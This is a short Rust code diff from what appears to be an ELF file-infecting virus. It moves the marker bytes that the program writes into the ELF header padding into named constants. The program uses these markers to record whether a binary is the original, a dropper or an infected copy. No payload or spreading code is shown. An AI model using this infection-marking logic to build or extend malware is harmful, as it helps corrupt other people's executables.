@@ -18,6 +18,8 @@ pub enum InfectionStatus {
 }
 
 const E_IDENT_START: usize = 0x09 * size_of::<u8>();
+const DROPPER_TAG : [u8 ; 1] = [137];
+const INFECT_TAG  : [u8 ; 1] = [67];
 
 pub fn create_dropper() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
@@ -91,12 +93,9 @@ pub fn get_own_infection_status() -> InfectionStatus {
     let own_contents = read(&own_path).expect("Failed to open myself...");
     let tag_location = vec![own_contents[E_IDENT_START]; 1];
 
-    let infect_tag = [67];
-    let dropper_tag = [137];
-
-    if is_tag_in_file_buffer(&infect_tag, &tag_location) {
+    if is_tag_in_file_buffer(&INFECT_TAG, &tag_location) {
         InfectionStatus::Infected
-    } else if is_tag_in_file_buffer(&dropper_tag, &tag_location) {
+    } else if is_tag_in_file_buffer(&DROPPER_TAG, &tag_location) {
         InfectionStatus::Dropper
     } else {
         InfectionStatus::Origin
@@ -108,11 +107,11 @@ fn is_tag_in_file_buffer(tag: &[u8], file_buffer: &[u8]) -> bool {
 }
 
 fn set_infected_tag(file_contents: &mut [u8]) {
-    file_contents[E_IDENT_START] = 67;
+    file_contents[E_IDENT_START] = INFECT_TAG[0];
 }
 
 fn set_dropper_tag(file_contents: &mut [u8]) {
-    file_contents[E_IDENT_START] = 137;
+    file_contents[E_IDENT_START] = DROPPER_TAG[0];
 }
 
 fn is_elf(file_path: &str) -> bool {
